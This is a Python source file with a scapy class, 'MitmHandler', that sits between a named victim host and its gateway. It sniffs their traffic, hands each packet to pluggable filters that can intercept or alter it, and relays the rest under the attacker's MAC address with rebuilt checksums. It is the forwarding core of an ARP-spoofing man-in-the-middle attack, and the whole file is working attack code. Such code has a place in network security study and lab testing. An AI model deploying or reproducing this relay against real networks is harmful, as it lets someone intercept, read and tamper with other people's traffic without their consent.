import scapy.all as sc
import threading
from scapy.layers.inet import IP, TCP, UDP
from scapy.layers.inet6 import IPv6
from scapy.layers.l2 import Ether

class MitmHandler:

    
    def __init__(self, interface, gateway_ip, victim_ip, attacker_mac, attacker_ip, attacker_ipv6, logger):
        self.interface = interface
        self.gateway_ip = gateway_ip
        self.victim_ip = victim_ip
        self.gateway_mac = self.get_mac(gateway_ip)
        self.victim_mac = self.get_mac(victim_ip)
        self.attacker_mac = attacker_mac
        self.attacker_ip = attacker_ip
        self.attacker_ipv6 = attacker_ipv6
        self.running = False
        self.logger = logger
        self.filters = []
        # Create a raw socket for sending to avoid scapy overhead/bugs in crucial forwarding path
        try:
            self.raw_socket = sc.conf.L2socket(iface=self.interface)
        except:
            self.raw_socket = None

    def add_filter(self, filter_handler):
        self.filters.append(filter_handler)

    # Get mac adress of a given IP adress
    #ToDo extract this to helper method
    def get_mac(self, ip):
        arp = sc.ARP(pdst=ip)
        broadcast = sc.Ether(dst="ff:ff:ff:ff:ff:ff")
        packet = broadcast / arp
        answered = sc.srp(packet, timeout=2, verbose=False, iface=self.interface)[0]
        for _, received in answered:
            return received.hwsrc
        return None
    
    def start(self):
        if(self.running):
            return
        
        self.running = True

        self.sniffing_thread = threading.Thread(
            target=self.sniffing_loop
        )
        self.sniffing_thread.daemon = True
        self.sniffing_thread.start()

    def stop(self):
        self.running = False

        if self.sniffing_thread:
            self.sniffing_thread.join(timeout=10)

    def sniffing_loop(self):
        try:
            sc.sniff(
                iface=self.interface,
                prn=self.packet_handler,
                # Create a filter that says the packets are not coming from us, and also create a filter that the packets come from / go to the victim.
                filter="",
                store=0,
                stop_filter=lambda _: not self.running
            )
        except Exception as e:
            self.logger(f"{e}")

    def packet_handler(self, packet):
        # Do not handle these packets.
        if not packet.haslayer(IP):
            return
        ip = packet[IP]

        if ip.src == self.attacker_ip:
            return
        if packet.haslayer(Ether) and packet[Ether].src == self.attacker_mac:
            return
        
        forward_packet = True
        for filter_handler in self.filters:
            try:
                # If the filter handler already handled the packet, we should no longer forward it later.
                if filter_handler(packet):
                    forward_packet = False
                    break
            except Exception as e:
                self.logger(f"{e}")

        if forward_packet:
            self.packet_forwarder(packet)

    def packet_forwarder(self, packet):
        try:
            if not packet.haslayer(IP):
                return

            # Robust handling: Force full reconstruction of the IP layer
            # This handles cases where in-place modification left the packet in a weird state
            # or where Scapy returned raw bytes for the layer.
            try:
                # We serialize the IP layer (bytes(...)) to commit any changes made by filters
                # Then we deserialize (IP(...)) to get a fresh, clean packet object with correct checksums/lengths
                ip_layer_obj = packet[IP]
                current_ip_bytes = bytes(ip_layer_obj)
                ip_pkt = IP(current_ip_bytes)
            except Exception:
                # If basic extraction fails, ignore packet
                return

            # Direction logic
            if ip_pkt.src == self.victim_ip:
                # Traffic from Victim -> Server
                ether = Ether(src=self.attacker_mac, dst=self.gateway_mac)
                if self.logger: self.logger(f"[MITM] Forwarding Victim({ip_pkt.src}) -> Server({ip_pkt.dst}) via {self.gateway_mac}")
            
            elif ip_pkt.dst == self.victim_ip:
                 # Traffic from Server -> Victim
                ether = Ether(src=self.attacker_mac, dst=self.victim_mac)
                if self.logger: self.logger(f"[MITM] Forwarding Server({ip_pkt.src}) -> Victim({ip_pkt.dst}) via {self.victim_mac}")
            else:
                return

            # Clean checksums just in case force-recalc is needed again
            del ip_pkt.chksum
            if ip_pkt.haslayer(TCP): del ip_pkt[TCP].chksum
            if ip_pkt.haslayer(UDP): del ip_pkt[UDP].chksum

            # Send without fragmentation for small redirects (Redirects are usually < 500 bytes)
            # Fragmentation can sometimes cause issues if not strictly needed
            
            # Use raw socket if available for speed/reliability
            final_pkt = ether / ip_pkt
            if self.raw_socket:
                self.raw_socket.send(final_pkt)
            else:
                sc.sendp(final_pkt, iface=self.interface, verbose=False)

        except Exception as e:
            self.logger(f"MITM Handler exception: {e}")
